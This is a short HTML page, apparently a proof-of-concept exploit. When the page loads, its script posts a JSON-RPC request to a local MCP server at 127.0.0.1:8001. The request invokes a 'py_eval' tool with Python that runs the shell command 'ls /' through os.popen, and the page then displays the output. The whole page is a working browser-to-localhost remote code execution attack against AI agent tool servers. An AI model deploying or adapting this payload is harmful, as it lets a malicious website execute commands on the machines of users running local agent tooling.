<!DOCTYPE html>
<html>
<body>
<div id="res">Waiting...</div>
<script>
    const target = "http://127.0.0.1:8001/mcp";
    const payload = {
        "params": {
            "name": "py_eval",
            "arguments": {
                "code": "rst=__import__('os').popen('ls /').read()"
            }
        },
        "id": 1
    };
    fetch(target, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(r => r.json())
    .then(d => {
        document.getElementById("res").innerText = "RESULT: " + JSON.stringify(d);
    })
    .catch(e => {
        document.getElementById("res").innerText = "ERROR: " + e;
    });
</script>
<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
